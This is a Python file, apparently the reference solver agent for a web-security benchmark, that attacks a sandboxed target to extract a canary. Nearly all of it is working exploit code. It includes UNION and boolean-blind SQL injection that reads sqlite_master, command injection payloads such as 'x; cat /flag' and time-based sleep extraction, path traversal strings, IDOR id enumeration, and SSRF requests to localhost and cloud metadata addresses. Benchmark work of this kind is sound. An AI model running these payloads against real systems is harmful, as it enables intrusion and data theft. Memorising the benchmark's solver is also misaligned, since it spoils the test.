from __future__ import annotations

"""secqurityVali/agents/reference_sqli/agent.py - a scripted SQLi solver.

The benchmark's own reference agent: it does, by hand, exactly what a miner's
agent is supposed to do -- find the injectable endpoint, read the (randomized)
schema through the injection, extract the canary, and write findings.json. It
uses no LLM; it is a fixed script, which is the right shape for a bounded task
like SQLi (see the LLM decision discussion).

It exists to prove two things: that the benchmark is solvable at all, and that
a competent agent's output scores as expected end to end. It also doubles as a
known-good agent for the sandbox and scoring tests.

It follows the agent contract: read TARGET_URL and OUTPUT_PATH from the
environment, and know nothing else -- not the canary, not which endpoint is
vulnerable, not the schema. Everything is discovered at runtime.

How it solves the challenge (a UNION-based SQL injection):

  1. Probe each candidate endpoint/parameter with a UNION that echoes a marker.
     The one that echoes the marker back is the injectable endpoint.
  2. Through it, read sqlite_master to list tables -> find the secret table
     (the one that isn't `products`).
  3. Read pragma_table_info to list that table's columns -> find the secret
     column (the one that isn't `id`).
  4. Select the secret column from the secret table -> the canary.
"""

import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# The agent is given only these two things.
TARGET_URL = os.getenv("TARGET_URL", "http://127.0.0.1:8000").rstrip("/")
OUTPUT_PATH = os.getenv("OUTPUT_PATH", "/out/findings.json")
RUN_ID = os.getenv("RUN_ID", "")

# The agent's own wordlists -- what any scanner would carry. It does NOT know
# which endpoint or parameter is the real one; it tries them.
CANDIDATE_ENDPOINTS = [
    "/api/products", "/api/search", "/api/users", "/api/orders", "/api/lookup",
    "/api/items", "/api/inventory", "/api/report", "/api/accounts", "/api/catalog",
]
CANDIDATE_PARAMS = ["q", "id", "name", "filter", "query", "search"]


# WHITE-BOX. A real security agent reads the code it attacks. When the validator
# mounts the target's source read-only at SECAUDIT_SOURCE_DIR, this agent analyses
# it ITSELF (bundled code_analysis, pure-ast, offline) to find the real
# endpoints/params/sinks -- it does not wait to be handed them. That self-found
# attack surface is tried first, ahead of the blind wordlist.
def _load_source_candidates():
    """Analyse the mounted source. Returns (endpoints, params). Best-effort: no
    source, or any failure, just yields nothing and we fall back to the wordlist."""
    d = os.getenv("SECAUDIT_SOURCE_DIR", "")
    if not d or not os.path.isdir(d):
        return [], []
    try:
        import code_analysis                      # bundled alongside agent.py
        cands = code_analysis.analyze_source(d)
    except Exception:
        return [], []
    eps, params = [], []
    for c in cands:
        if c.endpoint and c.endpoint not in eps:
            eps.append(c.endpoint)
        if c.parameter and c.parameter not in params:
            params.append(c.parameter)
    return eps, params


# Secondary: distilled hints the validator may still pass (SECAUDIT_HINTS). Kept
# as a fallback/supplement to the agent's own analysis.
def _load_hints():
    eps, params = [], []
    try:
        for h in json.loads(os.getenv("SECAUDIT_HINTS", "") or "[]"):
            ep, p = h.get("endpoint"), h.get("parameter")
            if ep and ep not in eps:
                eps.append(ep)
            if p and p not in params:
                params.append(p)
    except Exception:
        pass
    return eps, params


def _merge_ordered(*lists):
    out = []
    for lst in lists:
        for x in lst:
            if x and x not in out:
                out.append(x)
    return out


# The agent's own analysis first, validator hints second.
_SRC_ENDPOINTS, _SRC_PARAMS = _load_source_candidates()
_HINT_ENDPOINTS, _HINT_PARAMS = _load_hints()
HINT_ENDPOINTS = _merge_ordered(_SRC_ENDPOINTS, _HINT_ENDPOINTS)
HINT_PARAMS = _merge_ordered(_SRC_PARAMS, _HINT_PARAMS)


def _with_hints(endpoints, params):
    """Self-found + hinted endpoints/params first (the real, source-backed ones),
    then the shipped wordlist as a fallback. Deduped, order preserved."""
    eps = _merge_ordered(HINT_ENDPOINTS, endpoints)
    prm = _merge_ordered(HINT_PARAMS, params)
    return eps, prm


# --- EXPLORER / CRAWLER (Phase 2) --------------------------------------
# A real security agent doesn't guess from a wordlist -- it EXPLORES the running
# app like a user and maps the real attack surface. Authenticated (the session
# from _setup_auth is already installed), same-origin, bounded. Every discovered
# endpoint/param then drives the attack solvers via HINT_ENDPOINTS/HINT_PARAMS.
_LINK_RE = re.compile(r'''(?:href|action|src)\s*=\s*["']([^"'<>\s]{1,300})''', re.I)
_PATH_RE = re.compile(r'''["'](/[A-Za-z0-9_./\-]{1,120})["']''')      # JSON/JS paths
_NAME_RE = re.compile(r'''name\s*=\s*["']([A-Za-z0-9_\-\[\]]{1,60})["']''', re.I)
_JSONKEY_RE = re.compile(r'''["']([A-Za-z0-9_]{1,40})["']\s*:''')
_PARAM_OK = re.compile(r'^[A-Za-z0-9_\-\[\]]{1,60}$')


def _same_origin_path(href: str):
    """A same-origin path for href, or None. Absolute URLs matching TARGET_URL are
    rebased onto their path; other hosts, mailto/js/#/data are rejected (the agent
    is zero-egress anyway, but recon stays on-target by design)."""
    href = (href or "").strip()
    if not href or href[0] in "#?" or href.startswith(
            ("mailto:", "javascript:", "tel:", "data:", "//")):
        return None
    if href.startswith(("http://", "https://")):
        if href.startswith(TARGET_URL):
            href = href[len(TARGET_URL):] or "/"
        else:
            return None
    if not href.startswith("/"):
        href = "/" + href
    return href.split("#", 1)[0] or "/"


def _fetch(path: str, timeout: float):
    url = f"{TARGET_URL}{path}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read(400_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:         # 4xx/5xx body is still worth parsing
        try:
            return e.read(400_000).decode("utf-8", "replace")
        except Exception:
            return None
    except Exception:
        return None


def _endpoint_of(path: str) -> str:
    """Collapse a resource path to its endpoint: /api/orders/123 -> /api/orders."""
    segs = path.split("?", 1)[0].rstrip("/").split("/")
    if segs and segs[-1].isdigit():
        segs = segs[:-1]
    return "/".join(segs) or "/"


# A modern SPA (React/Next/Vue) renders in JS, so its real API surface lives in
# the JS bundles, not the HTML. These mine the bundles for endpoint paths (quoted
# OR backtick-template), and skip static assets.
# Match the path right after an opening quote/backtick -- NO closing delimiter is
# required, so a template literal like `/api/users/${id}` still yields /api/users.
_API_RE = re.compile(
    r'''["'`](/(?:api|v\d|rest|graphql|auth|internal|admin|user|account)[A-Za-z0-9_./\-]{0,100})''')
_MULTISEG_RE = re.compile(r'''["'`](/[A-Za-z0-9_\-]+(?:/[A-Za-z0-9_\-]+){1,5})''')
_ASSET_EXT = (".js", ".css", ".png", ".svg", ".woff", ".woff2", ".ttf", ".json",
              ".map", ".ico", ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".txt")


def _looks_like_api(path: str) -> bool:
    base = path.split("?", 1)[0].lower()
    if base.startswith(("/_next/", "/static/", "/assets/", "/_nuxt/")):
        return False
    return not base.endswith(_ASSET_EXT)


def _extract_js_apis(js_text: str) -> set:
    """Endpoint paths referenced inside a JS bundle -- the SPA's hidden API surface."""
    eps = set()
    for m in _API_RE.findall(js_text):
        eps.add(_endpoint_of(m))
    for m in _MULTISEG_RE.findall(js_text):
        if _looks_like_api(m):
            eps.add(_endpoint_of(m))
    return {e for e in eps if e and e != "/"}


def _crawl(max_pages: int = 30, timeout: float = 3.0, max_js: int = 12):
    global _PHASE; _PHASE = "recon"
    """Explore the app from '/': BFS the HTML pages, AND fetch the JS bundles and
    mine them for the real (SPA) API endpoints. Same-origin, deduped, bounded.
    Returns (endpoints, params). Never raises."""
    seen, queue = set(), ["/"]
    endpoints, params = [], set()
    js_urls = []
    while queue and len(seen) < max_pages:
        path = queue.pop(0)
        key = path.split("?", 1)[0]
        if key in seen:
            continue
        seen.add(key)
        body = _fetch(path, timeout)
        if not body:
            continue
        ep = _endpoint_of(path)
        if ep and ep != "/" and ep not in endpoints and _looks_like_api(ep):
            endpoints.append(ep)
        if "?" in path:
            for kv in path.split("?", 1)[1].split("&"):
                if "=" in kv:
                    params.add(kv.split("=", 1)[0])
        for href in set(_LINK_RE.findall(body)) | set(_PATH_RE.findall(body)):
            p = _same_origin_path(href)
            if not p:
                continue
            base = p.split("?", 1)[0]
            # a JS bundle -> queue it for mining, don't crawl it as a page
            if base.endswith(".js") and base not in js_urls and len(js_urls) < max_js:
                js_urls.append(base)
                continue
            if base not in seen and len(queue) < max_pages * 3:
                queue.append(p)
            if "?" in p:
                for kv in p.split("?", 1)[1].split("&"):
                    if "=" in kv:
                        params.add(kv.split("=", 1)[0])
        for name in _NAME_RE.findall(body):
            params.add(name)
        for name in _JSONKEY_RE.findall(body)[:40]:
            params.add(name)

    # mine the JS bundles for the SPA's real API endpoints
    for ju in js_urls[:max_js]:
        js = _fetch(ju, timeout + 2)
        if not js:
            continue
        for e in _extract_js_apis(js):
            if e not in endpoints:
                endpoints.append(e)

    clean = [p for p in params if _PARAM_OK.match(p)]
    return endpoints[:120], clean[:40]


MARKER = "S1NJ3CT0K"


# AUTHENTICATED ATTACK. When the customer supplied test credentials (SECAUDIT_CREDS),
# authenticate so the whole attack runs against the surface BEHIND login -- where
# most real vulnerabilities live. Every login path is rebased onto TARGET_URL (the
# sandboxed app by IP), so the credentials can never be sent anywhere else.
_AUTH_HEADER = None  # (name, value) added to every request in token mode
_PHASE = "recon"     # current solver phase; stamped on every request for the live view


class _AuthHeaderHandler(urllib.request.BaseHandler):
    def http_request(self, req):
        if _AUTH_HEADER:
            req.add_unredirected_header(_AUTH_HEADER[0], _AUTH_HEADER[1])
        try:
            req.add_unredirected_header("X-Audit-Phase", _PHASE)
        except Exception:
            pass
        return req
    https_request = http_request


def _setup_auth() -> None:
    global _PHASE; _PHASE = "auth"
    """Install a cookie-aware opener and, if credentials were given, log in. After
    this, every urlopen in the agent carries the session cookie / auth header."""
    global _AUTH_HEADER
    try:
        creds = json.loads(os.getenv("SECAUDIT_CREDS", "") or "null")
    except Exception:
        creds = None
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj), _AuthHeaderHandler())
    urllib.request.install_opener(opener)
    if not isinstance(creds, dict):
        return
    if creds.get("mode") == "token" and creds.get("header") and creds.get("value"):
        _AUTH_HEADER = (creds["header"], creds["value"])
        return
    if creds.get("mode") == "form":
        # rebase the login path onto the sandboxed target -- never hit an external host
        p = urllib.parse.urlparse(creds.get("login_url", "/login"))
        login_url = TARGET_URL + (p.path or "/") + (f"?{p.query}" if p.query else "")
        try:
            urllib.request.urlopen(login_url, timeout=8)     # GET -> cookies/CSRF seed
        except Exception:
            pass
        data = urllib.parse.urlencode({
            creds.get("username_field", "username"): creds.get("username", ""),
            creds.get("password_field", "password"): creds.get("password", ""),
        }).encode()
        try:
            urllib.request.urlopen(login_url, data=data, timeout=8)  # POST -> session cookie
        except Exception:
            pass


def _get(endpoint: str, param: str, value: str, timeout: float = 5.0) -> str:
    url = f"{TARGET_URL}{endpoint}?" + urllib.parse.urlencode({param: value})
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace")
    except Exception:
        return ""


def _fetch(path: str, timeout: float = 5.0) -> str:
    """Raw GET of a path on the target (no params) -- used for the discovery
    surface (/openapi.json, /)."""
    try:
        with urllib.request.urlopen(f"{TARGET_URL}{path}", timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace")
    except Exception:
        return ""


def discover_endpoints() -> tuple[list[str], list[str]]:
    """Discover the target's real attack surface the way a crawler must: read the
    OpenAPI spec (and fall back to the HTML index) to learn the endpoints and
    their query params. Endpoints are high-entropy per run, so this is the ONLY
    way to find them -- a shipped wordlist cannot. Returns (endpoints, params),
    both possibly empty (e.g. a target with no such surface)."""
    endpoints: list[str] = []
    params: list[str] = []

    raw = _fetch("/openapi.json")
    if raw:
        try:
            spec = json.loads(raw)
            for ep, item in (spec.get("paths") or {}).items():
                if isinstance(ep, str) and ep.startswith("/"):
                    endpoints.append(ep)
                    for p in ((item or {}).get("get") or {}).get("parameters", []):
                        name = p.get("name") if isinstance(p, dict) else None
                        if name:
                            params.append(name)
        except Exception:
            pass

    raw = _fetch("/")
    if raw:
        for href in re.findall(r'href=["\']([^"\']+)["\']', raw):
            ep = href.split("?")[0].split("#")[0]
            if ep.startswith("/") and ep not in ("/", "/health", "/openapi.json"):
                endpoints.append(ep)

    # de-dupe, preserve order
    endpoints = list(dict.fromkeys(endpoints))
    params = list(dict.fromkeys(params))
    return endpoints, params


def _union(mid: str, from_clause: str = "", context: str = "string") -> str:
    """A 3-column UNION payload (products has 3 columns): our value goes in the
    middle (name) column, an optional FROM/WHERE follows, and `-- -` comments
    out the rest. The prefix closes the injection point -- a quote for a string
    context, a bare number for a numeric one."""
    tail = f" {from_clause}" if from_clause else ""
    core = f"UNION SELECT 1, {mid}, 1{tail}"
    prefix = "0 " if context == "numeric" else "' "
    return f"{prefix}{core}-- -"


NAME_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
HEX_CHARSET = "0123456789abcdef"


def find_injectable() -> tuple[str, str, str, str] | None:
    """Return (endpoint, param, technique, context) for the injectable endpoint.

    Tries both techniques (union: does our marker echo in a row? boolean: does a
    true condition differ from a false one?) in both contexts (string vs numeric
    injection point), so it discovers whichever variant this run uses.

    Endpoints come from DISCOVERY (the target's OpenAPI/index); the shipped
    wordlist is only a fallback for a target with no discovery surface.
    """
    disc_eps, disc_params = discover_endpoints()
    base_eps = disc_eps or CANDIDATE_ENDPOINTS
    base_params = disc_params + [p for p in CANDIDATE_PARAMS if p not in disc_params]
    endpoints, params = _with_hints(base_eps, base_params)
    for endpoint in endpoints:
        for param in params:
            for context in ("string", "numeric"):
                body = _get(endpoint, param, _union(f"'{MARKER}'", context=context))
                if _marker_in_results(body):
                    return endpoint, param, "union", context
                if _is_boolean_injectable(endpoint, param, context):
                    return endpoint, param, "boolean", context
    return None


def _marker_in_results(body: str) -> bool:
    """True only if the marker appears in an actual results row -- not merely
    echoed inside a SQL error message (a wrong-context payload errors, and the
    error text contains the offending token, which would otherwise look like a
    successful injection)."""
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return False
    for row in data.get("results", []):
        if isinstance(row, list) and any(MARKER in str(c) for c in row):
            return True
    return False


# --- boolean-blind helpers ---------------------------------------------

def _bool_payload(condition: str, context: str) -> str:
    prefix = "0 OR" if context == "numeric" else "zzz' OR"
    return f"{prefix} ({condition})-- -"


def _btest(endpoint: str, param: str, condition: str, context: str) -> bool:
    """Ask the target a yes/no question via a boolean-blind OR injection: the
    response's `found` reflects `condition`."""
    body = _get(endpoint, param, _bool_payload(condition, context))
    try:
        return bool(json.loads(body).get("found"))
    except (json.JSONDecodeError, AttributeError):
        return False


def _is_boolean_injectable(endpoint: str, param: str, context: str) -> bool:
    """Injectable via boolean blind iff a true condition yields found=true and a
    false one yields found=false."""
    return _btest(endpoint, param, "1=1", context) and not _btest(endpoint, param, "1=2", context)


def _blind_string(endpoint: str, param: str, subquery: str, charset: str,
                  context: str, max_len: int = 64) -> str:
    """Reconstruct the string value of `subquery` one character at a time using
    only true/false answers."""
    out = ""
    for i in range(1, max_len + 1):
        if not _btest(endpoint, param, f"length(({subquery})) >= {i}", context):
            break
        found = None
        for c in charset:
            if _btest(endpoint, param, f"substr(({subquery}),{i},1)='{c}'", context):
                found = c
                break
        if found is None:
            break
        out += found
    return out


def _extract_column(endpoint: str, param: str, mid: str, from_clause: str = "",
                    context: str = "string") -> list[str]:
    """Run a UNION that puts `mid` in the middle (name) column and collect the
    values it returns.

    The vulnerable query returns the real products too, so injected rows are
    tagged with our marker and prefix-filtered -- otherwise product names would
    be mistaken for extracted data."""
    tagged = f"'{MARKER}:' || ({mid})"
    body = _get(endpoint, param, _union(tagged, from_clause, context))
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return []
    prefix = f"{MARKER}:"
    values = []
    for row in data.get("results", []):
        if isinstance(row, list) and len(row) >= 2 and isinstance(row[1], str):
            if row[1].startswith(prefix):
                values.append(row[1][len(prefix):])
    return values


def solve() -> dict | None:
    global _PHASE; _PHASE = "sqli"
    hit = find_injectable()
    if not hit:
        return None
    endpoint, param, technique, context = hit
    if technique == "boolean":
        return _solve_boolean(endpoint, param, context)
    return _solve_union(endpoint, param, context)


def _solve_boolean(endpoint: str, param: str, context: str) -> dict | None:
    """Blind extraction: find the secret table and column, then the canary,
    all through true/false answers."""
    table = _blind_string(
        endpoint, param,
        "SELECT name FROM sqlite_master WHERE type='table' AND name!='products' LIMIT 1",
        NAME_CHARSET, context,
    )
    if not table:
        return None
    column = _blind_string(
        endpoint, param,
        f"SELECT name FROM pragma_table_info('{table}') WHERE name!='id' LIMIT 1",
        NAME_CHARSET, context,
    )
    if not column:
        return None
    canary = _blind_string(
        endpoint, param, f'SELECT "{column}" FROM "{table}" LIMIT 1', HEX_CHARSET, context,
    )
    if not canary:
        return None
    return {
        "endpoint": endpoint,
        "parameter": param,
        "injection_type": "sql_injection",
        "payload": _bool_payload(
            f"substr((SELECT \"{column}\" FROM \"{table}\"),1,1)='?'", context),
        "severity": "high",
        "confidence": 0.95,
        "evidence": {"canary": canary},
    }


def _solve_union(endpoint: str, param: str, context: str) -> dict | None:
    # 2. tables -> the secret table is the one that isn't products
    tables = _extract_column(
        endpoint, param, "name", "FROM sqlite_master WHERE type='table'", context
    )
    secret_tables = [t for t in tables if t and t != "products"]
    if not secret_tables:
        return None
    secret_table = secret_tables[0]

    # 3. columns of that table -> the secret column is the one that isn't id
    cols = _extract_column(
        endpoint, param, "name", f"FROM pragma_table_info('{secret_table}')", context
    )
    secret_cols = [c for c in cols if c and c != "id"]
    if not secret_cols:
        return None
    secret_column = secret_cols[0]

    # 4. extract the canary
    values = _extract_column(
        endpoint, param, f'"{secret_column}"', f'FROM "{secret_table}"', context)
    # the canary is the value that isn't an ordinary product name
    products = {"Widget", "Gadget", "Sprocket", "Cog"}
    canary_values = [v for v in values if v not in products]
    if not canary_values:
        return None
    canary = canary_values[0]

    payload = _union(f'"{secret_column}"', f'FROM "{secret_table}"', context)
    return {
        "endpoint": endpoint,
        "parameter": param,
        "injection_type": "sql_injection",
        "payload": payload,
        "severity": "high",
        "confidence": 0.99,
        "evidence": {"canary": canary},
    }


# --- command injection (cmdi) solver -----------------------------------
# A second category. The canary lives in a file (/flag) on the target; the only
# way to read it is to execute a command through the injection. We try the common
# separators/contexts and look for a 32-hex canary in the returned output.
CMDI_ENDPOINTS = [
    "/api/ping", "/api/dns", "/api/trace", "/api/resolve", "/api/whois",
    "/api/netcheck", "/api/lookup", "/api/diag", "/api/tools", "/api/status",
]
CMDI_PARAMS = ["host", "target", "ip", "addr", "q", "name"]
FLAG_PATH = "/flag"
_HEX32 = re.compile(r"[0-9a-f]{32}")
# Cover basic (`;`) and filtered (`;`/`&` stripped -> pipe / $() / backtick /
# newline survive) output variants.
CMDI_PAYLOADS = (
    "x; cat {f}", "x | cat {f}", "x$(cat {f})", "x`cat {f}`", "x\ncat {f}",
)


def _cmdi_output(body: str) -> str:
    try:
        return str(json.loads(body).get("output", ""))
    except (json.JSONDecodeError, AttributeError):
        return ""


def cmdi_solve() -> dict | None:
    global _PHASE; _PHASE = "cmdi"
    """Find the command-injection endpoint and read the canary from /flag."""
    for endpoint in _with_hints(CMDI_ENDPOINTS, CMDI_PARAMS)[0]:
        for param in _with_hints(CMDI_ENDPOINTS, CMDI_PARAMS)[1]:
            for tmpl in CMDI_PAYLOADS:
                payload = tmpl.format(f=FLAG_PATH)
                out = _cmdi_output(_get(endpoint, param, payload))
                m = _HEX32.search(out)
                if m:
                    return {
                        "endpoint": endpoint,
                        "parameter": param,
                        "injection_type": "command_injection",
                        "payload": payload,
                        "severity": "high",
                        "confidence": 0.97,
                        "evidence": {"canary": m.group(0)},
                    }
    return None


# --- blind (time-based) command injection -------------------------------
# When the endpoint returns no output, read /flag one char at a time via a
# conditional `sleep`: if the response is slow, the guessed char was right.
CMDI_SLEEP = 2                 # seconds the oracle sleeps on a true condition
CMDI_SLOW = CMDI_SLEEP - 0.7   # a response at/above this means "condition true"
CMDI_HEX = "0123456789abcdef"


def _timed_get(endpoint: str, param: str, value: str, timeout: float = 20.0) -> float:
    url = f"{TARGET_URL}{endpoint}?" + urllib.parse.urlencode({param: value})
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            resp.read()
    except Exception:
        pass
    return time.monotonic() - t0


def _cmdi_blind_extract(endpoint: str, param: str) -> str:
    """Reconstruct the 32-hex canary in /flag by timing, char by char."""
    out = ""
    for i in range(1, 33):
        for c in CMDI_HEX:
            payload = f'x; test "$(cut -c{i}-{i} {FLAG_PATH})" = "{c}" && sleep {CMDI_SLEEP}'
            if _timed_get(endpoint, param, payload) >= CMDI_SLOW:
                out += c
                break
        else:
            break   # nothing matched at this position -> stop
    return out


def cmdi_blind_solve() -> dict | None:
    global _PHASE; _PHASE = "cmdi"
    """Find the blind cmdi endpoint (a `; sleep` delays the response), then
    extract the canary from /flag by timing."""
    for endpoint in _with_hints(CMDI_ENDPOINTS, CMDI_PARAMS)[0]:
        for param in _with_hints(CMDI_ENDPOINTS, CMDI_PARAMS)[1]:
            if _timed_get(endpoint, param, f"x; sleep {CMDI_SLEEP}") >= CMDI_SLOW:
                canary = _cmdi_blind_extract(endpoint, param)
                if len(canary) == 32:
                    return {
                        "endpoint": endpoint,
                        "parameter": param,
                        "injection_type": "command_injection",
                        "payload": f'x; test "$(cut -c1-1 {FLAG_PATH})" = "?" && sleep {CMDI_SLEEP}',
                        "severity": "high",
                        "confidence": 0.9,
                        "evidence": {"canary": canary},
                    }
    return None


# --- path traversal / LFI solver ----------------------------------------
# The canary lives in /flag, outside the served dir. Traverse out to read it,
# covering the three variants (basic / filtered-nested / double-encoded) across a
# range of depths. The flag's basename is the conventional "flag".
LFI_ENDPOINTS = [
    "/api/download", "/api/view", "/api/file", "/api/read", "/api/doc",
    "/api/attachment", "/api/export", "/api/media", "/api/content", "/api/fetch",
]
LFI_PARAMS = ["file", "path", "name", "doc", "f", "filename"]
LFI_FLAG = "flag"
LFI_MAX_DEPTH = 8


def _lfi_content(body: str) -> str:
    try:
        return str(json.loads(body).get("content", ""))
    except (json.JSONDecodeError, AttributeError):
        return ""


def _lfi_payloads(depth: int) -> list[str]:
    return [
        "../" * depth + LFI_FLAG,            # basic
        "....//" * depth + LFI_FLAG,         # filtered (collapses to ../ x depth)
        "%2e%2e%2f" * depth + LFI_FLAG,      # encoded (double-encoded on the wire)
    ]


def lfi_solve() -> dict | None:
    global _PHASE; _PHASE = "lfi"
    """Find the traversal endpoint and read the canary from /flag."""
    for endpoint in _with_hints(LFI_ENDPOINTS, LFI_PARAMS)[0]:
        for param in _with_hints(LFI_ENDPOINTS, LFI_PARAMS)[1]:
            for depth in range(1, LFI_MAX_DEPTH + 1):
                for payload in _lfi_payloads(depth):
                    out = _lfi_content(_get(endpoint, param, payload))
                    m = _HEX32.search(out)
                    if m:
                        return {
                            "endpoint": endpoint,
                            "parameter": param,
                            "injection_type": "path_traversal",
                            "payload": payload,
                            "severity": "high",
                            "confidence": 0.97,
                            "evidence": {"canary": m.group(0)},
                        }
    return None


def _reproduction_for(finding: dict) -> list:
    """The structured replay recipe for a finding. IDOR is PATH-based (read another
    user's resource by id); the injection categories are QUERY-based (the payload on
    a parameter). The validator rebuilds the request from these fields -- it never
    runs anything the agent supplied."""
    if finding.get("injection_type") == "idor":
        return [{
            "finding_index": 0,
            "method": "GET",
            "path": f"{finding['endpoint']}/{finding.get('resource_id', '')}",
            "query": {},
        }]
    return [{
        "finding_index": 0,
        "method": "GET",
        "path": finding["endpoint"],
        "query": {finding["parameter"]: finding["payload"]},
    }]


def build_findings(finding: dict | None) -> dict:
    return {
        "schema_version": "1.0",
        "run_id": RUN_ID,
        "agent": {"name": "reference-agent", "version": "1.1.0"},
        "findings": [finding] if finding else [],
        "reproduction": _reproduction_for(finding) if finding else [],
    }


# --- IDOR / broken access control solver -------------------------------
# Authenticated as one user (the session comes from SECAUDIT_CREDS), enumerate
# resource ids on each endpoint and look for one we can read that belongs to
# ANOTHER user -- that is the broken access control. The other user's resource
# holds the canary, so extracting it proves the exploit (a session alone doesn't).

def _discover_idor_endpoints() -> list:
    """GET / for the resource endpoints the app advertises (e.g. '/api/notes/{id}'
    -> '/api/notes'). Falls back to the hinted endpoints."""
    eps = []
    try:
        with urllib.request.urlopen(f"{TARGET_URL}/", timeout=5) as r:
            for e in (json.loads(r.read().decode()).get("endpoints") or []):
                base = str(e).split("/{")[0].rstrip("/")
                if base:
                    eps.append(base)
    except Exception:
        pass
    return _merge_ordered(eps, HINT_ENDPOINTS)


def _read_resource(ep: str, rid: int):
    """GET ep/rid with the authenticated session. (body, owner) on 200, else
    (None, None) -- a 401/403/404 raises and is swallowed, so only real reads
    are recorded."""
    try:
        with urllib.request.urlopen(f"{TARGET_URL}{ep}/{rid}", timeout=4) as r:
            body = r.read().decode("utf-8", "replace")
        try:
            return body, str(json.loads(body).get("owner"))
        except Exception:
            return body, None
    except Exception:
        return None, None


def idor_solve() -> dict | None:
    global _PHASE; _PHASE = "idor"
    """Broken access control: read another user's resource by id. Needs a session
    (without SECAUDIT_CREDS every endpoint is 401, so there's nothing to exploit)."""
    if not os.getenv("SECAUDIT_CREDS"):
        return None
    endpoints = _discover_idor_endpoints()
    if not endpoints:
        return None

    reads = []                      # (endpoint, id, owner, body) for every 200
    owner_endpoints = {}            # owner -> set of endpoints we could read it on
    for ep in endpoints:
        for rid in range(1, 40):
            body, owner = _read_resource(ep, rid)
            if owner is not None:
                reads.append((ep, rid, owner, body))
                owner_endpoints.setdefault(owner, set()).add(ep)
    if not reads:
        return None

    # our own id = the owner readable on the MOST endpoints (our own resource is
    # readable everywhere; a cross-user one only on the broken endpoint).
    my_id = max(owner_endpoints, key=lambda o: len(owner_endpoints[o]))

    # IDOR = a resource we read that belongs to someone else AND leaks the canary.
    for ep, rid, owner, body in reads:
        if owner != my_id:
            m = _HEX32.search(body or "")
            if m:
                return {
                    "endpoint": ep,
                    "parameter": "id",
                    "injection_type": "idor",
                    "resource_id": rid,          # for the path-based replay step
                    "payload": f"GET {ep}/{rid} as a different user",
                    "severity": "high",
                    "confidence": 0.95,
                    "evidence": {"canary": m.group(0)},
                }
    return None


# --- SSRF / server-side request forgery solver ------------------------
# Point a url-fetch endpoint at an internal host; the vulnerable one returns that
# host's content (the canary). Query-based, no session needed -- the existing
# query reproduction step replays it directly.
SSRF_ENDPOINTS = [
    "/api/fetch", "/api/preview", "/api/webhook", "/api/import", "/api/thumbnail",
    "/api/proxy", "/api/screenshot", "/api/oembed", "/api/resolve", "/api/callback",
]
SSRF_PARAMS = ["url", "target", "uri", "link", "callback", "src"]
SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/", "http://0.0.0.0/", "http://metadata.google.internal/",
]


def ssrf_solve() -> dict | None:
    global _PHASE; _PHASE = "ssrf"
    """Find the url-fetch endpoint with no SSRF filter and make it fetch an
    internal host -> the canary comes back. The surface is whatever the crawler/
    hints found, with the shipped wordlist as a fallback."""
    eps, params = _with_hints(SSRF_ENDPOINTS, SSRF_PARAMS)
    for ep in eps:
        for param in params:
            for payload in SSRF_PAYLOADS:
                body = _get(ep, param, payload)
                m = _HEX32.search(body or "")
                if m:
                    return {
                        "endpoint": ep,
                        "parameter": param,
                        "injection_type": "ssrf",
                        "payload": payload,
                        "severity": "high",
                        "confidence": 0.95,
                        "evidence": {"canary": m.group(0)},
                    }
    return None


def main() -> int:
    # Authenticate first (if creds were given) so every probe below runs against
    # the surface behind login.
    _setup_auth()
    # EXPLORE: crawl the app and feed the real, discovered endpoints/params into the
    # hint pool, so every solver attacks what the app ACTUALLY exposes (not just a
    # shipped wordlist). Best-effort -- a crawl failure just leaves the wordlist.
    global HINT_ENDPOINTS, HINT_PARAMS
    try:
        c_eps, c_params = _crawl()
        HINT_ENDPOINTS = _merge_ordered(c_eps, HINT_ENDPOINTS)
        HINT_PARAMS = _merge_ordered(c_params, HINT_PARAMS)
    except Exception:
        pass
    # Fast solvers first, slow time-based blind last (so non-blind targets never
    # pay for it): IDOR (session) -> SQLi -> SSRF -> output cmdi -> LFI -> blind cmdi.
    finding = (idor_solve() or solve() or ssrf_solve() or cmdi_solve()
               or lfi_solve() or cmdi_blind_solve())
    doc = build_findings(finding)
    os.makedirs(os.path.dirname(OUTPUT_PATH) or ".", exist_ok=True)
    with open(OUTPUT_PATH, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, indent=2)
    if finding:
        print(f"reference-sqli: found injection at {finding['endpoint']} "
              f"({finding['parameter']}), extracted canary")
        return 0
    print("reference-sqli: no injection found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
